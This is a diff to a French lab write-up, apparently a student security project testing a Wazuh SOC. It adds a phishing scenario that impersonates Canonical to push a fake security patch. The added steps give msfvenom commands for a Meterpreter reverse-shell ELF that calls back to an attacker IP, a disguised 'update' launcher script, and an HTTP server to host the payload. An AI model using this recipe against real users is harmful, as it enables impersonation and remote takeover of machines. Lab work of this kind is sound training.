@@ -19,10 +19,31 @@ Les étapes de l'implémentation sont assez bien décrites, documentées et expl
 
 ## Déroulé de l'attaque
 
-Nous avons choisi d'effectuer une attque de phishing. 
-Pour celà nous avons commencé par créer une campagne de phishing.
+Nous avons choisi d'effectuer une attque de phishing. Le but de l'attaque est de produire une payload revershell que nous allons zipper, et introduire le lien de téléchargement de la payload dans un mail. Mail dans lequel nous ne faisons passer pour l'entreprise Canonical demandant ainsi à un utilisateur de télécharger et de lancer le script dans le but de patcher une faille de sécurité recemment découverte. 
 
-### 1 - Création d'une campagne de phishing
+Pour celà nous avons commencé par créer une campagne de phishing.  
+
+### 1 - Création de la payload   
+
+```bash
+mkdir update
+cd update
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.133.128 LPORT=6677 -f elf -o update.elf
+```
+Ensuite nous créons un fichier `script.sh` dans le meme repertoire avec ceci dedans
+```
+!/bin/bash
+echo "Mise à jour en cours !!! Ne fermez pas cette fenêtre"
+./update.elf
+```
+On peut ensuite zipper le tout et créer un serveur HTTP accessible à la cible.
+```
+cd ..
+zip -r update/ update.zip
+python3 -m http.server 8888
+```
+
+### 2 - Création d'une campagne de phishing
 #### a - Install de Gophish
 Ayant opté pour l'outil Gopgish, la première étape consiste à installe l'outil. 
 ```bash
@@ -120,5 +141,13 @@ mailhog
 
 Ainsi on a un serveur local SMTP qui tourne sur `localhost:1025` et on peut accéder à la boite mail sur `localhost:8025`  
 
-#### d - Lacement de la campagne de fishing  
+#### d - Lancement de la campagne de fishing  
 
+/// Image de création de la campagne
+
+/// Image du succès
+
+## Résultats
+Depuis notre machine Ubuntu qui représente l'agent Wazuh et donc ma cible, nous pouvons accéder à la boite mail via l'url http://192.168.133.128:8025 dans le navigateur.  
+
+Pour tester nos résultats nous avons configurés le SOC de sorte qu'il surveille de manière active le repertoire root, log toute modification et scan les fichiers ajoutés avec Virus Total. Si le fichier est considéré comme une menace alors il est supprimé. 
